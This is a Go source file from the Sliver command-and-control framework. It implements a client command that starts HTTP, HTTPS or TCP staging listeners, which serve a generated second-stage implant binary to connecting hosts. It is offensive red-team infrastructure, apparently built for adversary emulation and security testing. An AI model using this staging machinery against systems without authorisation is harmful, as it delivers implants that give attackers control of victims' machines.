package c2

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"net/url"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
)

// StageListener - Start a staging listener.
type StageListener struct {
	Options struct {
		URL         string `long:"url" short:"u" description:"listener URL (tcp://ip:port or http(s)://ip:port)" required:"true" value-name:"stage URL"`
		Profile     string `long:"profile"  short:"p" description:"implant profile to link with the listener"`
		LetsEncrypt bool   `long:"lets-encrypt" description:"attempt to provision a let's encrypt certificate (HTTPS only)"`
		Certificate string `long:"certificate" short:"c" description:"PEM encoded certificate file (HTTPS only)"`
		PrivateKey  string `long:"key" short:"k" description:"PEM encoded private key file (HTTPS only)"`
		Persistent  bool   `long:"persistent" short:"P" description:"make listener persistent across server restarts"`
	} `group:"staging listener options"`
}

// Execute - Start a staging listener.
func (s *StageListener) Execute(args []string) (err error) {

	rpc := transport.RPC

	var implantProfile *clientpb.ImplantProfile
	profileName := s.Options.Profile
	listenerURL := s.Options.URL

	if profileName == "" || listenerURL == "" {
		return log.Errorf("missing required flags, see `help stage-listener` for more info")
	}

	// parse listener url
	stagingURL, err := url.Parse(listenerURL)
	if err != nil {
		return log.Errorf("listener-url format not supported")
	}
	stagingPort, err := strconv.ParseUint(stagingURL.Port(), 10, 32)
	if err != nil {
		return log.Errorf("error parsing staging port: %v", err)
	}

	// get profile
	profiles, err := getSliverProfiles()
	if err != nil {
		return log.Error(err)
	}
	if len(*profiles) == 0 || profiles == nil {
		return log.Errorf("No profiles, create one with `profiles generate`")
	}

	for name, profile := range *profiles {
		if name == profileName {
			implantProfile = profile
		}
	}

	if implantProfile.GetName() == "" {
		return log.Errorf("could not find the implant name from the profile")
	}

	stage2, err := GetSliverBinary(*implantProfile, rpc)
	if err != nil {
		return log.Errorf("Error: %v", err)
	}

	switch stagingURL.Scheme {
	case "http":
		ctrl := make(chan bool)
		go log.SpinUntil("Starting HTTP staging listener...", ctrl)
		stageListener, err := rpc.StartHTTPStagerListener(context.Background(), &clientpb.StagerListenerReq{
			Protocol: clientpb.StageProtocol_HTTP,
			Data:     stage2,
			Host:     stagingURL.Hostname(),
			Port:     uint32(stagingPort),
		})
		ctrl <- true
		<-ctrl
		if err != nil {
			return log.Errorf("Error starting HTTP staging listener: %v", err)
		}
		log.Infof("Job %d (http) started\n", stageListener.GetJobID())
	case "https":
		if s.Options.Certificate == "" || s.Options.PrivateKey == "" {
			return log.Errorf("Please provide --cert and --key if using HTTPS URL")
		}
		cert, key, err := getLocalCertificatePair(s.Options.Certificate, s.Options.PrivateKey)
		if err != nil {
			return log.Errorf("Failed to load local certificate %v", err)
		}
		ctrl := make(chan bool)
		go log.SpinUntil("Starting HTTPS staging listener...", ctrl)
		stageListener, err := rpc.StartHTTPStagerListener(context.Background(), &clientpb.StagerListenerReq{
			Protocol: clientpb.StageProtocol_HTTPS,
			Data:     stage2,
			Host:     stagingURL.Hostname(),
			Port:     uint32(stagingPort),
			Cert:     cert,
			Key:      key,
			ACME:     s.Options.LetsEncrypt,
		})
		ctrl <- true
		<-ctrl
		if err != nil {
			return log.Errorf("Error starting HTTPS staging listener: %v", err)
		}
		log.Infof("Job %d (https) started\n", stageListener.GetJobID())
	case "tcp":
		ctrl := make(chan bool)
		go log.SpinUntil("Starting TCP staging listener...", ctrl)
		stageListener, err := rpc.StartTCPStagerListener(context.Background(), &clientpb.StagerListenerReq{
			Protocol: clientpb.StageProtocol_TCP,
			Data:     stage2,
			Host:     stagingURL.Hostname(),
			Port:     uint32(stagingPort),
		})
		ctrl <- true
		<-ctrl
		if err != nil {
			return log.Errorf("Error starting TCP staging listener: %v", err)
		}
		log.Infof("Job %d (tcp) started\n", stageListener.GetJobID())

	default:
		return log.Errorf("Unsupported staging protocol: %s", stagingURL.Scheme)
	}

	return
}

// GetSliverBinary - Get the bytes of an implant binary.
func GetSliverBinary(profile clientpb.ImplantProfile, rpc rpcpb.SliverRPCClient) ([]byte, error) {
	var data []byte
	// get implant builds
	builds, err := rpc.ImplantBuilds(context.Background(), &commonpb.Empty{})
	if err != nil {
		return data, err
	}

	implantName := buildImplantName(profile.GetConfig().GetName())
	_, ok := builds.GetConfigs()[implantName]
	if implantName == "" || !ok {
		// no built implant found for profile, generate a new one
		log.Infof("No builds found for profile %s, generating a new one\n", profile.GetName())
		ctrl := make(chan bool)
		go log.SpinUntil("Compiling, please wait ...", ctrl)
		generated, err := rpc.Generate(context.Background(), &clientpb.GenerateReq{
			Config: profile.GetConfig(),
		})
		ctrl <- true
		<-ctrl
		if err != nil {
			fmt.Println("Error generating implant")
			return data, err
		}
		data = generated.GetFile().GetData()
		profile.Config.Name = buildImplantName(generated.GetFile().GetName())
		_, err = rpc.SaveImplantProfile(context.Background(), &profile)
		if err != nil {
			fmt.Println("Error updating implant profile")
			return data, err
		}
	} else {
		// Found a build, reuse that one
		log.Infof("Sliver name for profile: %s\n", implantName)
		regenerate, err := rpc.Regenerate(context.Background(), &clientpb.RegenerateReq{
			ImplantName: profile.GetConfig().GetName(),
		})

		if err != nil {
			return data, err
		}
		data = regenerate.GetFile().GetData()
	}
	return data, err
}

func buildImplantName(name string) string {
	return strings.TrimSuffix(name, filepath.Ext(name))
}

func getSliverProfiles() (profiles *map[string]*clientpb.ImplantProfile, err error) {
	pbProfiles, err := transport.RPC.ImplantProfiles(context.Background(), &commonpb.Empty{})
	if err != nil {
		return nil, log.Error(err)
	}
	profiles = &map[string]*clientpb.ImplantProfile{}
	for _, profile := range pbProfiles.Profiles {
		(*profiles)[profile.Name] = profile
	}
	return profiles, nil
}
